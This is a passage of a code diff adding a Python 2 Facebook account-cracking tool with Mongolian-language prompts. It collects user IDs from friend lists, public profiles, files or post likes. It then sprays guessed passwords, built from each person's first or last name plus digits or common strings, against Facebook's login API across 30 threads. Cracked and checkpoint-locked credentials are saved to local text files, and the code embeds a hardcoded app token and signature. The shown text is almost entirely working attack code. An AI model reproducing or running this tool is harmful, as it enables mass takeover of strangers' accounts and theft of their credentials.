+												oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+												oke.close()
+												oks.append(zowe)
+											else:
+												if 'www.facebook.com' in ko['error_msg']:
+													print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+													print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos5
+													cek = open("done/usa.txt", "a")
+													cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+													cek.close()
+													cekpoint.append(zowe)
+																			
+		except:
+			pass
+			
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\n\033[1;94m──────────────────────────────────────────────────"
+	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mАмжилттай дууслаа ...'
+	print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНийт \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
+	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mФайл Хадгалсан \033[1;91m: \033[1;92mdone/usa.txt'
+	print 50* "\033[1;94m─"
+	raw_input("\033[1;97m{<\033[1;95mБуцах\033[1;97m>}")
+	os.system("python2 kira.py")
+	
+##### Pakistan улсаас #####
+def crack_pakis():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{\033[1;91m01\033[1;97m} Өөрийн Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;91m02\033[1;97m} Нийтэд ил Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;91m03\033[1;97m} Файлаас"
+	print "\033[1;97m{\033[1;91m00\033[1;97m} Буцах"
+	print 50* "\033[1;94m─"
+	pilih_pakis()
+
+#### PILIH PAKISTAN ####
+def pilih_pakis():
+	teak = raw_input("\033[1;91mKira \033[91m:\033[1;92m ")
+	if teak =="":
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih_pakis()
+	elif teak =="1" or teak =="01":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("             \033[1;91m●●● \033[1;97mPakistan улсаас \033[1;91m●●●")
+		print 50* "\033[1;94m─"
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif teak =="2" or teak =="02":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("             \033[1;91m●●● \033[1;97mPakistan улсаас \033[1;91m●●●")
+		print 50* "\033[1;94m─"
+		idt = raw_input("\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mНийтэд ил Найзын Жагсаалтаас \033[1;91m:\033[1;92m ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mНэр \033[1;91m:\033[1;92m "+op["name"]
+		except KeyError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} ID  !"
+			raw_input("\n\033[1;91m[\033[1;97m<Буцах>\033[1;91m]")
+			crack_pakis()
+		except requests.exceptions.ConnectionError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} Интернэт холболтоо шалгана уу !"
+			keluar()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif teak =="3" or teak =="03":
+		os.system('clear')
+		print logo
+		try:
+			print 50* "\033[1;94m─"
+			print ("             \033[1;91m●●● \033[1;97mPakistan улсаас \033[1;91m●●●")
+			print 50* "\033[1;94m─"
+			idlist = raw_input('\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mНэр File\033[1;91m :\033[1;92m ')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга ! '
+			raw_input('\n\033[1;92m[ \033[1;97mБуцах \033[1;92m]')
+		except IOError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга !'
+			raw_input("\n\033[1;91m[\033[1;97m<Буцах>\033[1;91m]")
+			crack_pakis()
+	elif teak =="0" or teak =="00":
+		menu()
+	else:
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih_pakis()
+	
+	print "\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mНийт ID \033[1;91m:\033[1;92m "+str(len(id))
+	print('\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mЗогсоох бол CTRL+Z')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mАжиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
+	print("\n\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mАжиллахгүй байвал Airplane mode асааж унтраана уу")
+	print ("\033[1;94m──────────────────────────────────────────────────")
+	
+##### MAIN PAKISTAN #####
+	def main(arg):
+		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
+		global cekpoint,oks
+		zowe = arg
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+		try:
+			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
+			j = json.loads(an.text)
+			bos1 = j['first_name'].lower()+'123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			ko = json.load(data)
+			if 'access_token' in ko:
+				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos1
+				oke = open("done/pakis.txt", "a")
+				oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+				oke.close()
+				oks.append(zowe)
+			else:
+				if 'www.facebook.com' in ko['error_msg']:
+					print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+					print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos1
+					cek = open("done/pakis.txt", "a")
+					cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+					cek.close()
+					cekpoint.append(zowe)
+				else:
+					bos2 = j['first_name'].lower()+'1234'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					ko = json.load(data)
+					if 'access_token' in ko:
+						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos2
+						oke = open("done/pakis.txt", "a")
+						oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+						oke.close()
+						oks.append(zowe)
+					else:
+						if 'www.facebook.com' in ko['error_msg']:
+							print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+							print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos2
+							cek = open("done/pakis.txt", "a")
+							cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+							cek.close()
+							cekpoint.append(zowe)
+						else:
+							bos3 = j['first_name'].lower()+'12345'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							ko = json.load(data)
+							if 'access_token' in ko:
+								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos3
+								oke = open("done/pakis.txt", "a")
+								oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+								oke.close()
+								oks.append(zowe)
+							else:
+								if 'www.facebook.com' in ko['error_msg']:
+									print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+									print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos3
+									cek = open("done/pakis.txt", "a")
+									cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+									cek.close()
+									cekpoint.append(zowe)
+								else:
+									bos4 = ('Mongol')
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									ko = json.load(data)
+									if 'access_token' in ko:
+										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos4
+										oke = open("done/pakis.txt", "a")
+										oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+										oke.close()
+										oks.append(zowe)
+									else:
+										if 'www.facebook.com' in ko['error_msg']:
+											print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+											print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos4
+											cek = open("done/pakis.txt", "a")
+											cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+											cek.close()
+											cekpoint.append(zowe)
+										else:
+											bos5 = ('12345678')
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											ko = json.load(data)
+											if 'access_token' in ko:
+												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos5
+												oke = open("done/pakis.txt", "a")
+												oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+												oke.close()
+												oks.append(zowe)
+											else:
+												if 'www.facebook.com' in ko['error_msg']:
+													print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+													print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos5
+													cek = open("done/pakis.txt", "a")
+													cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+													cek.close()
+													cekpoint.append(zowe)
+												else:
+													bos6 = j['last_name'].lower()+'786'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													ko = json.load(data)
+													if 'access_token' in ko:
+														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos6
+														oke = open("done/pakis.txt", "a")
+														oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos6+"\n")
+														oke.close()
+														oks.append(zowe)
+													else:
+														if 'www.facebook.com' in ko['error_msg']:
+															print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+															print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos6
+															cek = open("done/pakis.txt", "a")
+															cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos6+"\n")
+															cek.close()
+															cekpoint.append(zowe)
+														else:
+															bos7 = j['last_name'].lower()+'123'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															ko = json.load(data)
+															if 'access_token' in ko:
+																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos7
+																oke = open("done/pakis.txt", "a")
+																oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos7+"\n")
+																oke.close()
+																oks.append(zowe)
+															else:
+																if 'www.facebook.com' in ko['error_msg']:
+																	print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;91mЦООЖТОЙ")
+																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+																	print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos7
+																	cek = open("done/pakis.txt", "a")
+																	cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos7+"\n")
+																	cek.close()
+																	cekpoint.append(zowe)
+																else:
+																	bos8 = j['last_name'].lower()+'1234'
+																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																	ko = json.load(data)
+																	if 'access_token' in ko:
+																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos8
+																		oke = open("done/pakis.txt", "a")
+																		oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos8+"\n")
+																		oke.close()
+																		oks.append(zowe)
+																	else:
+																		if 'www.facebook.com' in ko['error_msg']:
+																			print ("\n\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} \x1b[1;93mЦООЖТОЙ")
+																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;91m") + j['name']
+																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;91m") + zowe
+																			print ("\x1b[1;97m{\x1b[1;91m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;91m") + bos8
+																			cek = open("done/pakis.txt", "a")
+																			cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos8+"\n")
+																			cek.close()
+																			cekpoint.append(zowe)
+																			
+		except:
+			pass
+			
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\n\033[1;94m──────────────────────────────────────────────────"
+	print '\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mАмжилттай дууслаа ...'
+	print"\033[1;97m{\033[1;91m●\033[1;97m} \033[1;91mНийт \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
+	print '\033[1;97m{\033[1;91m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;91mФайл Хадгалсан \033[1;91m: \033[1;92mdone/pakis.txt'
+	print 50* "\033[1;94m─"
+	raw_input("\033[1;97m{<\033[1;91mБуцах\033[1;97m>}")
+	os.system("python2 kira.py")
+	
+##### CRACK LIKES #####
+def crack_likes():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m[!] Cookie Алдаатай"
+		os.system('rm -rf login.txt')
+		time.sleep(0.01)
+		login()
+	try:
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("        \033[1;96m●●● \033[1;97mCrack from post\033[1;96m ●●●")
+		print 50* "\033[1;94m─"
+		tez = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m ID post Group/Friend \033[1;91m :\033[1;92m ")
+		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+		jalan('\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mБуруу ID \033[1;97m...')
+	except KeyError:
+		print"\033[1;97m{\033[1;91m!\033[1;97m} ID post  !"
+		raw_input("\n\033[1;96m[<\033[1;97mБуцах>\033[1;96m]")
+		menu()
+		
+	print "\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mНийт ID \033[1;91m:\033[1;92m "+str(len(id))
+	print('\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mЗогсоох бол CTRL+Z')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАжиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
+	print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАжиллахгүй байвал Airplane mode асааж унтраана уу")
+	print ("\033[1;94m──────────────────────────────────────────────────")
+	
+##### MAIN LIKES #####
+	def main(arg):
+		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
+		global cekpoint,oks
+		zowe = arg
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+		try:
+			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
+			j = json.loads(an.text)
+			bos1 = j['first_name'].lower()+'123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			ko = json.load(data)
+			if 'access_token' in ko:
+				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos1
+				oke = open("done/grup.txt", "a")
+				oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+				oke.close()
+				oks.append(zowe)
+			else:
+				if 'www.facebook.com' in ko['error_msg']:
+					print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos1
+					cek = open("done/grup.txt", "a")
+					cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+					cek.close()
+					cekpoint.append(zowe)
+				else:
+					bos2 = j['first_name'].lower()+'1234'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					ko = json.load(data)
+					if 'access_token' in ko:
+						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos2
+						oke = open("done/grup.txt", "a")
+						oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+						oke.close()
+						oks.append(zowe)
+					else:
+						if 'www.facebook.com' in ko['error_msg']:
+							print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos2
+							cek = open("done/grup.txt", "a")
+							cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+							cek.close()
+							cekpoint.append(zowe)
+						else:
+							bos3 = j['first_name'].lower()+'12345'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							ko = json.load(data)
+							if 'access_token' in ko:
+								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
